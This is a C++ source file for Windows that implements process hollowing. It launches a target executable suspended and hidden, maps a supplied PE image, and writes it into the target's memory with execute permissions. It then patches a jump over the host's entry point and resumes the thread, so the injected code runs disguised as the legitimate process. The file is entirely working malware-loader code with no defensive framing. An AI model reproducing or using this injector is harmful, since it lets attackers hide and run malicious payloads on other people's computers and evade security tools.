#include <Windows.h>

#include "hollow.h"

#include "common/mem.h"
#include "common/str.h"
#include "debug/error.h"

ERROR_CODE hollow::entry(__in LPCVOID raw_image, __in LPCSTR target)
{
	ERROR_CODE			status;

	// Basic tests on target
	status = pretest(target);
	CHECK_STATUS(status);

	status = check_pe(raw_image);
	CHECK_STATUS(status);

	// Start suspended process
	PROCESS_INFORMATION	process_info;
	STARTUPINFOA		startup_info;
	HOLLOW_ZEROMEM(&process_info, sizeof(PROCESS_INFORMATION));
	HOLLOW_ZEROMEM(&startup_info, sizeof(STARTUPINFOA));
	status = (ERROR_CODE)HOLLOW_CREATEPROCESSA(	(LPCSTR)target,
												NULL,
												NULL,
												NULL,
												FALSE,
												CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
												NULL,
												NULL,
												&startup_info,
												&process_info);
	if (!status) {
		return error::ER_HOLLOW_CREATE_PROCESS;
	}

	LPVOID				virtual_image;
	UINT				virtual_image_size;
	status = setup_virtual_image(raw_image, &virtual_image, &virtual_image_size);
	CHECK_STATUS(status);

	status = hollow::inject(&process_info, virtual_image, virtual_image_size);
	CHECK_STATUS(status);

	return error::ER_HOLLOW_OK;
}

static ERROR_CODE hollow::check_pe(LPCVOID raw_image)
{
	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;

	dos_header	= (PIMAGE_DOS_HEADER)raw_image;
	if (dos_header->e_magic != 'ZM') {
		return error::ER_HOLLOW_PE;
	}

	nt_headers	= (PIMAGE_NT_HEADERS)((DWORD_PTR)raw_image + dos_header->e_lfanew);
	if (nt_headers->Signature != 'EP') {
		return error::ER_HOLLOW_PE;
	}

	return error::ER_HOLLOW_OK;
}

ERROR_CODE hollow::pretest(LPCSTR target)
{
	ERROR_CODE	status;
	LPVOID		raw_buffer;
	UINT		raw_buffer_size;

	status = (ERROR_CODE)HOLLOW_LOADRAWFILE(target, &raw_buffer_size, (LPVOID *)&raw_buffer);
	if (!status || (raw_buffer_size == 0) || (raw_buffer == NULL)) {
		return error::ER_HOLLOW_PRETEST;
	}

	HOLLOW_FREE(raw_buffer);

	return error::ER_HOLLOW_OK;
}

static ERROR_CODE hollow::setup_virtual_image(	__in	LPCVOID		raw_image,
												__out	LPVOID		*virtual_image,
												__out	PUINT		virtual_image_size)
{
	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header;

	PVOID						virtual_pe;

	UINT						i;

	dos_header		= (PIMAGE_DOS_HEADER)raw_image;
	nt_headers		= (PIMAGE_NT_HEADERS)((DWORD_PTR)raw_image + dos_header->e_lfanew);

	*virtual_image_size = nt_headers->OptionalHeader.SizeOfImage;

	virtual_pe		= (PVOID)HOLLOW_MALLOC(*virtual_image_size);
	HOLLOW_ZEROMEM(virtual_pe, *virtual_image_size);

	// Headers
	HOLLOW_MEMCPY(virtual_pe, (LPVOID)raw_image, nt_headers->OptionalHeader.SizeOfHeaders);

	// Segments
	section_header	= (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(nt_headers);
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {

		if ((section_header->SizeOfRawData == 0) || (section_header->PointerToRawData == NULL)) {
			section_header++;
			continue;
		}

		HOLLOW_MEMCPY(	(PVOID)((DWORD_PTR)virtual_pe + section_header->VirtualAddress),
						(PVOID)((DWORD_PTR)raw_image + section_header->PointerToRawData),
						section_header->SizeOfRawData);
		section_header++;
	}
	
	*virtual_image = (LPVOID *)virtual_pe;

	return error::ER_HOLLOW_OK;
}

static ERROR_CODE hollow::inject(PPROCESS_INFORMATION process, LPCVOID virtual_image, UINT virtual_image_size)
{
	ERROR_CODE		status;

	DWORD			image_base;
	DWORD			remote_host_oep;
	INT				bytes_written;

	//HANDLE			remote_thread;
	//DWORD			remote_thread_id;

	//CONTEXT			context;

	INT				bytes;

	BYTE			opcode;
	DWORD			operand;

	image_base		= find_base(virtual_image);

	status = (ERROR_CODE)HOLLOW_VIRTALLOCEX(process->hProcess, (LPVOID)image_base, virtual_image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!status) {
		return error::ER_HOLLOW_ALLOC;
	}

	status = (ERROR_CODE)HOLLOW_WRITEPROCMEM(process->hProcess, (LPVOID)image_base, virtual_image, virtual_image_size, (PUINT)&bytes_written);
	if (!status || (bytes_written != virtual_image_size)) {
		return error::ER_HOLLOW_WRITE;
	}

	// Obsolete
	/*
	remote_thread = HOLLOW_CREATEREMOTETHR(	process,
											NULL,
											0,
											hollow_find_oep(virtual_image),
											NULL,
											0,
											&remote_thread_id);
	if ((remote_thread == INVALID_HANDLE_VALUE) || (remote_thread_id == 0)) {
		return ERROR_HOLLOW_THREAD;
	}*/

	// Adjust thread context
	/*
	HOLLOW_ZEROMEM(&context, sizeof(CONTEXT));
	//ResumeThread(process->hThread);
	//Sleep(1000);
	//SuspendThread(process->hThread);
	status = (ERROR_CODE)HOLLOW_GETCONTEXT(process->hThread, &context);
	if (!status) {
		return ERROR_HOLLOW_THREAD;
	}

	context.Eip = 0xffffffff;

	status = (ERROR_CODE)HOLLOW_SETCONTEXT(process->hThread, &context);
	if (!status) {
		return ERROR_HOLLOW_THREAD;
	}*/

	remote_host_oep = hollow::get_remote_host_oep(process);

	opcode	= HOLLOW_OPCODE;
	operand	= (DWORD)((DWORD)hollow::find_oep(virtual_image) - remote_host_oep - sizeof(BYTE[5]));
	status = (ERROR_CODE)HOLLOW_WRITEPROCMEM(	process->hProcess,
												(LPVOID)remote_host_oep,
												&opcode,
												sizeof(opcode),
												(PUINT)&bytes);
	if (!status || (bytes != sizeof(opcode))) {
		return error::ER_HOLLOW;
	}

	status = (ERROR_CODE)HOLLOW_WRITEPROCMEM(	process->hProcess,
												(LPVOID)((DWORD)remote_host_oep + sizeof(opcode)),
												&operand,
												sizeof(operand),
												(PUINT)&bytes);
	if (!status || (bytes != sizeof(operand))) {
		return error::ER_HOLLOW;
	}

	HOLLOW_RESTHREAD(process->hThread);
	return error::ER_HOLLOW_OK;
}

static DWORD hollow::find_base(LPCVOID virtual_image)
{
	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;

	dos_header = (PIMAGE_DOS_HEADER)virtual_image;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);

	return nt_headers->OptionalHeader.ImageBase;
}

static DWORD hollow::get_remote_host_oep(PPROCESS_INFORMATION process)
{
	ERROR_CODE						status;

	PROCESS_BASIC_INFORMATION		proc_info;
	DWORD							remote_base;

	PVOID							buffer;
	DWORD							offset;
	DWORD							oep;

	INT								bytes;

	HOLLOW_ZEROMEM(&proc_info, sizeof(PROCESS_BASIC_INFORMATION));
	status = (ERROR_CODE)HOLLOW_QUERYPROC(	process->hProcess,
											(PROCESSINFOCLASS)0,
											&proc_info,
											sizeof(PROCESS_BASIC_INFORMATION),
											(PULONG)&bytes);
	if (status || (bytes != sizeof(PROCESS_BASIC_INFORMATION))) {
		return error::ER_HOLLOW_EP;
	}

	status = (ERROR_CODE)HOLLOW_READPROCMEM(process->hProcess,
											(LPCVOID)((DWORD_PTR)proc_info.PebBaseAddress + 8),
											&remote_base,
											sizeof(DWORD_PTR),
											(PUINT)&bytes);
	if (!status || (bytes != sizeof(DWORD_PTR))) {
		return error::ER_HOLLOW_EP;
	}

	// Read in DOS header
	buffer = (PVOID)HOLLOW_MALLOC(sizeof(IMAGE_DOS_HEADER));
	HOLLOW_ZEROMEM(buffer, sizeof(IMAGE_DOS_HEADER));
	status = (ERROR_CODE)HOLLOW_READPROCMEM(process->hProcess,
											(LPCVOID)remote_base,
											buffer,
											sizeof(IMAGE_DOS_HEADER),
											(PUINT)&bytes);
	if (!status || (bytes != sizeof(IMAGE_DOS_HEADER))) {
		return error::ER_HOLLOW_EP;
	}
	if (((PIMAGE_DOS_HEADER)buffer)->e_magic != 'ZM') {
		return error::ER_HOLLOW_EP;
	}
	offset = ((PIMAGE_DOS_HEADER)buffer)->e_lfanew;
	HOLLOW_FREE(buffer);

	// Read in PE header
	buffer = (PVOID)HOLLOW_MALLOC(sizeof(IMAGE_NT_HEADERS));
	HOLLOW_ZEROMEM(buffer, sizeof(IMAGE_NT_HEADERS));
	status = (ERROR_CODE)HOLLOW_READPROCMEM(process->hProcess,
											(LPCVOID)((DWORD)remote_base + (DWORD)offset),
											buffer,
											sizeof(IMAGE_NT_HEADERS),
											(PUINT)&bytes);
	if (!status || (bytes != sizeof(IMAGE_NT_HEADERS))) {
		return error::ER_HOLLOW_EP;
	}
	if (((PIMAGE_NT_HEADERS)buffer)->Signature != 'EP') {
		return error::ER_HOLLOW_EP;
	}
	oep	  = ((PIMAGE_NT_HEADERS)buffer)->OptionalHeader.AddressOfEntryPoint;
	HOLLOW_FREE(buffer);

	return (oep + remote_base);
}

static LPTHREAD_START_ROUTINE hollow::find_oep(LPCVOID virtual_image)
{
	if (virtual_image == NULL) {
		return (LPTHREAD_START_ROUTINE)NULL;
	}

	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;

	dos_header = (PIMAGE_DOS_HEADER)virtual_image;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);

	return (LPTHREAD_START_ROUTINE)(nt_headers->OptionalHeader.AddressOfEntryPoint 
		+ nt_headers->OptionalHeader.ImageBase);
}

hollow::hl_instance::hl_instance(__in const str_string& target_file,
								 __in const mem::buffer2& raw_pe)
{
	this->TargetFile	= new str_string(*target_file);
	this->RawPE			= new mem::buffer2(*raw_pe, raw_pe.get_raw_size());

	return;
}

bool hollow::hl_instance::hollow_target(void)
{
	ERROR_CODE hollow_status = hollow::entry(**this->RawPE, **this->TargetFile);
	if (hollow_status != error::ER_HOLLOW_OK) {
		return false;
	}

	return true;
}